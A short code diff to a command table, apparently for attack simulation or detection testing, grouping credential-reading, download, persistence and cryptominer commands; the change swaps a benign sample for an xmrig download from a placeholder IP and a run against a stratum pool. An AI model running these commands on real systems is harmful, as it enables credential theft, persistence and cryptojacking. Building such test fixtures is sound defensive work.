@@ -19,7 +19,7 @@ COMMAND_GROUPS = {
     "credentials": ["cat /etc/passwd", "ls -la /root/.ssh", "cat ~/.bash_history"],
     "download": ["cd /tmp", "wget http://203.0.113.99/sample.sh", "chmod +x sample.sh"],
     "persistence": ["crontab -l", "useradd -m analyst-test", "echo test-entry >> /tmp/demo.log"],
-    "miner": ["cd /tmp", "wget http://203.0.113.99/sample.bin", "./sample.bin --version"],
+    "miner": ["cd /tmp", "wget http://203.0.113.99/xmrig", "./xmrig -o stratum+tcp://pool.test:3333"],
 }
 
 
